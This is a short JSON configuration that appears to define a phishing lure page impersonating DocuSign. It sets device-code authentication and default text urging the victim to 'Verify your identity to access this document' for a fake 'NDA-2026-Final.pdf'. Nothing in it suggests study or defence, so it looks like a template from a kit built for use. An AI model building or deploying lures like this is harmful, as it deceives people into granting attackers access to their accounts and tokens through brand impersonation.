{
  "name": "DocuSign 8",
  "category": "no_preload",
  "preload": false,
  "auth_mode": "devicecode",
  "fields": [
    {
      "key": "title",
      "label": "Page Title",
      "type": "text",
      "default": "ready for review"
    },
    {
      "key": "message",
      "label": "Page Message",
      "type": "text",
      "default": "Verify your identity to access this document"
    },
    {
      "key": "button_text",
      "label": "Button Text",
      "type": "text",
      "default": "Review Document"
    },
    {
      "key": "file_name",
      "label": "File Name",
      "type": "text",
      "default": "NDA-2026-Final.pdf"
    },
    {
      "key": "pages",
      "label": "Pages",
      "type": "number",
      "default": 4
    }
  ],
  "background": {
    "default": "",
    "editable": false,
    "blur": false
  }
}